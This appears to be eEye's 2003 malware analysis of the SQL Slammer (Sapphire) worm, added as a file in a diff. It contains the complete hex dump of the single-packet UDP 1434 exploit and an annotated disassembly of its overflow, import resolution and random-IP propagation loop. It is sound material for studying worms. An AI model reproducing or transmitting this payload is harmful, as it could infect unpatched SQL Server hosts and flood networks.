@@ -1,0 +1,222 @@
+
+UDP Port 1434 (note always a single packet)
+
+Targets unpatched SQL Server 2000 and Microsoft Desktop Engine (MSDE) 2000 systems
+
+0000 04 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 ................
+0010 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 ................
+0020 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 ................
+0030 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 ................
+0040 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 ................
+0050 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 ................
+0060 01 DC C9 B0 42 EB 0E 01 01 01 01 01 01 01 70 AE ....B.........p.
+0070 42 01 70 AE 42 90 90 90 90 90 90 90 90 68 DC C9 B.p.B........h..
+0080 B0 42 B8 01 01 01 01 31 C9 B1 18 50 E2 FD 35 01 .B.....1...P..5.
+0090 01 01 05 50 89 E5 51 68 2E 64 6C 6C 68 65 6C 33 ...P..Qh.dllhel3
+00A0 32 68 6B 65 72 6E 51 68 6F 75 6E 74 68 69 63 6B 2hkernQhounthick
+00B0 43 68 47 65 74 54 66 B9 6C 6C 51 68 33 32 2E 64 ChGetTf.llQh32.d
+00C0 68 77 73 32 5F 66 B9 65 74 51 68 73 6F 63 6B 66 hws2_f.etQhsockf
+00D0 B9 74 6F 51 68 73 65 6E 64 BE 18 10 AE 42 8D 45 .toQhsend....B.E
+00E0 D4 50 FF 16 50 8D 45 E0 50 8D 45 F0 50 FF 16 50 .P..P.E.P.E.P..P
+00F0 BE 10 10 AE 42 8B 1E 8B 03 3D 55 8B EC 51 74 05 ....B....=U..Qt.
+0100 BE 1C 10 AE 42 FF 16 FF D0 31 C9 51 51 50 81 F1 ....B....1.QQP..
+0110 03 01 04 9B 81 F1 01 01 01 01 51 8D 45 CC 50 8B ..........Q.E.P.
+0120 45 C0 50 FF 16 6A 11 6A 02 6A 02 FF D0 50 8D 45 E.P..j.j.j...P.E
+0130 C4 50 8B 45 C0 50 FF 16 89 C6 09 DB 81 F3 3C 61 .P.E.P........<a
+0140 D9 FF 8B 45 B4 8D 0C 40 8D 14 88 C1 E2 04 01 C2 ...E...@........
+0150 C1 E2 08 29 C2 8D 04 90 01 D8 89 45 B4 6A 10 8D ...).......E.j..
+0160 45 B0 50 31 C9 51 66 81 F1 78 01 51 8D 45 03 50 E.P1.Qf..x.Q.E.P
+0170 8B 45 AC 50 FF D6 EB CA                         .E.P.... 
+
+
+
+;SAPPHIRE WORM CODE DISASSEMBLED 
+;eEye Digital Security: January 25, 2003 
+;Updated January 27, 2003 
+
+                    push    42B0C9DCh       ; [RET] sqlsort.dll -> jmp esp 
+                    mov     eax, 1010101h   ; 
+                                            ; Reconstruct session, after the overflow the payload buffer 
+                                            ; gets corrupted during program execution but before the 
+                                            ; payload is executed. The worm writer rebuilds the buffer 
+                                            ; so he can later resend it in the sendto() loop. 
+                    xor     ecx, ecx 
+                    mov     cl, 18h 
+     
+    fixup_payload:                           
+                    push    eax 
+                    loop    fixup_payload 
+                    xor     eax, 5010101h   ; 0x1010101 xor 0x5010101 = 0x04000000 (msg_type for sql resoloution request) 
+                                            ; 
+                                            ; 0x04 is the msg type for request, he has no rebuilt the payload 
+                                            ; so it can be fired over the wire later and reinfect. 
+                    push    eax 
+                    mov     ebp, esp        ; 
+                                            ; Move esp into ebp. This will allow him to reference data 
+                                            ; pushed onto the stack later using ebp. He could use esp 
+                                            ; also except for the fact that he push's a lot of values and 
+                                            ; an esp offset will not as reliable. So he chose ebp... 
+                                            ; 
+                    push    ecx             ; 
+                                            ; During this phase a series of strings and terminating 
+                                            ; nulls are pushed onto the stack. This method is common 
+                                            ; in simple exploits that don't require a large amount of 
+                                            ; imports to operate. It should also noted that the worm 
+                                            ; use’s the ecx register to store nulls, after it is 
+                                            ; decremented to zero from the loop routine. 
+                                            ; 
+                    push    6C6C642Eh 
+                    push    32336C65h 
+                    push    6E72656Bh       ; Push string kernel32.dll 
+                    push    ecx 
+                    push    746E756Fh       ; Push string GetTickCount 
+                    push    436B6369h 
+                    push    54746547h 
+                    mov     cx, 6C6Ch 
+                    push    ecx 
+                    push    642E3233h       ; Push string ws2_32.dll 
+                    push    5F327377h 
+                    mov     cx, 7465h 
+                    push    ecx 
+                    push    6B636F73h       ; Push string socket 
+                    mov     cx, 6F74h 
+                    push    ecx 
+                    push    646E6573h       ; Push string sendto 
+                                            ; 
+                    mov     esi, 42AE1018h  ; sqlsort.dll->IAT entry for LoadLibrary 
+                                            ; 
+                                            ; The worm writer uses the sqlsort IAT to locate 
+                                            ; the entry points for LoadLibrary and GetProcAddress. 
+                                        
+                                            ; 
+                    lea     eax, [ebp-2Ch]  ; Load address of string "ws2_32.dll" into eax and 
+                                            ; supply as an argument to LoadLibrary. 
+                    push    eax 
+                    call    dword ptr [esi] ; call  sqlsort:[IAT]->LoadLibrary("ws2_32.dll") 
+                                            ; 
+                    push    eax             ; When LoadLibrary returns, the base of ws2_32 is in eax. 
+                                            ; This will be used later for a GetProcAddress so he saves 
+                                            ; it on the stack using a push.. 
+                                            ; 
+                    lea     eax, [ebp-20h]  ; Load address of string "GetTickCount" into eax and 
+                                            ; push it on the stack. This will be used as an argument 
+                                            ; to the GetProcAddress call after the next LoadLibrary call. 
+                    push    eax 
+                    lea     eax, [ebp-10h]  ; Load address of string "kernel32.dll" into eax 
+                    push    eax 
+                    call    dword ptr [esi] ; call  sqlsort:[IAT]->LoadLibrary("kernel32.dll") 
+                                            ; 
+                    push    eax             ; When LoadLibrary returns, the base of kernel32 is in eax. 
+                                            ; This will be used later for a GetProcAddress so he saves 
+                                            ; it on the stack using a push.. 
+                                            ; 
+                    mov     esi, 42AE1010h  ; Move sqlsort:[IAT] entry into esi. The IAT, or Import Address 
+                                            ; Table will shift across dll versions so the worm writer checks a 
+                                            ; small instruction sequence at the entry point of the function to 
+                                            ; verify that it is in fact, GetProcAddress. 
+                                            ; 
+                                            ; 
+                    mov     ebx, [esi]      ; Move IAT entry (function entry point) into ebx. 
+                                            ; 
+                    mov     eax, [ebx]      ; Move 4 bytes of instructions from function entry point into eax. 
+                                            ; 
+                    cmp     eax, 51EC8B55h  ; Check entry point fingerprint for getprocaddress, if the compare fails he uses 
+                                            ; an assumed IATentry. So he checks the entry, if it's not GetProcAddress he 
+                                            ; assumes it's an alternate dll version and uses the static entry in that assumed 
+                                            ; dll version. 
+                                            ; 
+                                            ; The library version I have is:2000.80.534.0. This dll version hips with a base 
+                                            ; installation of MSSQL server 2000.  The IATwith this DLL is an entry point for 
+                                            ; RtlEnterCriticalSection, so the first check will obviously fail and the jz will 
+                                            ; not succeed. 
+                                            ; 
+                                            ; It is undetermined what dll versions this payload will succeed on. Due to 
+                                            ; the "if not, then other"  importing scheme, this may not work across all dll 
+                                            ; versions. 
+                                            ; 
+                                            ; 
+                    jz      short FOUND_IT  ; GetProcAddress(kernel32_base,GetTickCount) 
+                    mov     esi, 42AE101Ch  ; This point is only reached if the previous test failed. On a 
+                                            ; default install of MSSQL Server 2000, we will reach this point. 
+                                            ; Then next assignment will assign esi the sqlsort.dll->IAT entry 
+                                            ; for GetProcAddress. 
+     
+    FOUND_IT:                                
+                    call    dword ptr [esi] ; GetProcAddress(kernel32_base,GetTickCount) 
+                    call    eax             ; GetTickCount() 
+                    xor     ecx, ecx 
+                    push    ecx 
+                    push    ecx 
+                    push    eax             ; Push GetTickCount returned value, which is the number 
+                                            ; of milliseconds since the system was last started. This value 
+                                            ; will later be used as a seed for the pseudo random number 
+                                            ; generation. 
+                                            ; 
+                                            ; 
+                    xor     ecx, 9B040103h  ; 0x9B040103 xor 0x1010101 = 9A050002 (dest port/family) 
+                                            ; 
+                    xor     ecx, 1010101h 
+                    push    ecx             ; 9A050002 = port 1434 / AF_INET 
+                                            ; 
+                    lea     eax, [ebp-34h]  ; Load address of string "socket" into eax and supply 
+                                            ; it as the second argument to GetProcAddress 
+                    push    eax 
+                    mov     eax, [ebp-40h]  ; Load ws2_32 base address into eax and 
+                                            ; supply as first argument to GetProcAddress. 
+                    push    eax 
+                    call    dword ptr [esi] ; GetProcAddress(ws2_32,socket) 
+                    push    11h 
+                    push    2 
+                    push    2 
+                    call    eax             ; socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) 
+                                            ; 
+                    push    eax             ; Push socket descriptor 
+                                            ; 
+                    lea     eax, [ebp-3Ch]  ; Load address of string "sendto" into eax and 
+                                            ; supply it as the second argument to GetProcAddress. 
+                    push    eax 
+                    mov     eax, [ebp-40h]  ; Load ws2_32 base address into eax and 
+                                            ; supply it as the first address to GetProcAddress. 
+                    push    eax 
+                    call    dword ptr [esi] ; GetProcAddress(ws2_32,sendto) 
+                    mov     esi, eax        ; Save the entry point for sendto, returned by GetProcAddress 
+                                            ; into esi. 
+                                            ; 
+                    or      ebx, ebx        ; ebx = 77F8313C, left over from the sqlsort IAT reads. 
+                                            ; 
+                    xor     ebx, 0FFD9613Ch ; We'll end up with 0x88215000 or 0x88336870, depending on dll 
+                                            ; version. Other values are generated depending on dll version. 
+                                            ; 
+     
+    PSEUDO_RAND_SEND:                        
+                    mov     eax, [ebp-4Ch]  ; Load the seed from GetTickCount into eax and enter pseudo 
+                                            ; random generation. The pseudo generation also takes input from 
+                                            ; an xor'd IAT entry to assist in more random generation. 
+                                            ; 
+                    lea     ecx, [eax+eax*2] 
+                    lea     edx, [eax+ecx*4] 
+                    shl     edx, 4 
+                    add     edx, eax 
+                    shl     edx, 8 
+                    sub     edx, eax 
+                    lea     eax, [eax+edx*4] 
+                    add     eax, ebx 
+                    mov     [ebp-4Ch], eax  ; Store generated IP address into sock_addr structure. 
+                    push    10h 
+                    lea     eax, [ebp-50h]  ; Load address of the sock_addr structure that was 
+                                            ; created earlier, into eax, then push as an argument 
+                                            ; to sendto(). 
+                                            ; 
+                    push    eax 
+                    xor     ecx, ecx        ; Push (flags) = 0 
+                    push    ecx 
+                    xor     cx, 178h        ; Push payload length = 376 
+                    push    ecx 
+                    lea     eax, [ebp+3]    ; Push address of payload 
+                    push    eax 
+                    mov     eax, [ebp-54h] 
+                    push    eax 
+                    call    esi             ; sendto(sock,payload,376,0, sock_addr struct, 16) 
+                                            ; 
+                    jmp     short PSEUDO_RAND_SEND 
+
